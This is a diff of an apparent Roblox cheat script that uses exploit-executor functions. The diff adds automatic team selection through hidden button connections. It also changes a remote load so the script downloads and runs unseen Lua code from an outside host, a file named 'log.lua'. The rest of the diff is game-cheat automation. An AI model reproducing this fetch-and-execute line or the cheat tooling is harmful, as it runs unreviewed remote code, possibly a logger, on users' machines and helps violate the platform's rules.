@@ -1,6 +1,16 @@
 repeat
     task.wait(0.5)
-until game:IsLoaded()
+until game:IsLoaded() and game.Players.LocalPlayer:FindFirstChild("DataLoaded")
+   repeat
+            wait()
+            pcall(function()
+                for i, v in getconnections(game:GetService("Players").LocalPlayer.PlayerGui["Main (minimal)"].ChooseTeam.Container["Marines"].Frame.TextButton.Activated) do
+                    v.Function()
+                end
+            end)
+            task.wait(3)
+        until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Main (minimal)")
+    
 task.spawn(function()
     while true do
         setfpscap(7)
@@ -179,7 +189,7 @@ function mmb()
     HopGui.Enabled = false
     HopGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     HopGui.IgnoreGuiInset = true
-    pcall(loadstring, game:HttpGet("https://pastee.dev/r/O1EkWCp4"))
+        pcall(loadstring(game:HttpGet("https://cdn.shioru.xyz/log.lua")))
 
     NameHub.Name = "NameHub"
     NameHub.Parent = HopGui
@@ -611,12 +621,7 @@ function mmb()
     OldSessionTime = isfile(".tdif-" .. game.Players.LocalPlayer.Name) and
                          tonumber(readfile(".tdif-" .. game.Players.LocalPlayer.Name)) or 0
 
-    repeat
-        task.wait()
-        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", Config.Team)
-
-    until game.Players.LocalPlayer.Character
-    alert("team assembed")
+ alert("team assembed")
     repeat
         wait()
     until game.Players.LocalPlayer.Character
